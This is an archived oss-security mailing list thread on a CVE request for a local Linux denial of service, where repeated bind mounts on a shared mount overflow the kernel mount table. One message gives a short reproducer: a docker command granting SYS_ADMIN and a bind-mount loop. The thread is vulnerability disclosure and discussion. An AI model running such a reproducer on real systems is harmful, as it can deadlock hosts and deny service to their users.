  oss-security - Re: Re: cve request: local DoS by overflowing kernel  mount table using shared bind mount            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Thu, 14 Jul (EDT) From: CAI Qian <caiqian@...hat.com> To: Greg KH <greg@...ah.com> Cc: oss-security@...ts.openwall.com, cve-assign@...re.org Subject: Re: Re: cve request: local DoS by overflowing kernel  mount table using shared bind mount  Maybe this is a better reproducer using docker. It is exploitable even with user namespace enabled.  # docker run -it -v /mnt/:/mnt/:shared --cap-add=SYS_ADMIN rhel7 /bin/bash  # cat /proc/self/uid_map           0              # cat /proc/self/gid_map           0              (insider container) # for i in `seq 1 20`; mount -o bind /mnt/1 /mnt/2; done    CAI Qian  ----- Original Message ----- > From: "Greg KH" <greg@...ah.com> > To: oss-security@...ts.openwall.com > Cc: caiqian@...hat.com, cve-assign@...re.org > Sent: Wednesday, July 13, PM > Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount >  > On Wed, Jul 13, at cve-assign@...re.org wrote: > > > It was reported that the mount table expands by a power-of-two > > > with each bind mount command. > >  > > > If the system is configured in the way that a non-root user > > > allows bind mount even if with limit number of bind mount > > > allowed, a non-root user could cause a local DoS by quickly > > > overflow the mount table. > >  > > > it will cause a deadlock for the whole system, > >  > > >> form of unlimited memory consumption that is causing the problem > >  > > Use >  > A CVE for an "improperly configured system"?  Huh?  What distro has such > a configuration set by default?  This isn't a kernel bug, so what is > this CVE classified as being "against"?  It better not be against the > Linux kernel... >  > confused, >  > greg k-h >   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      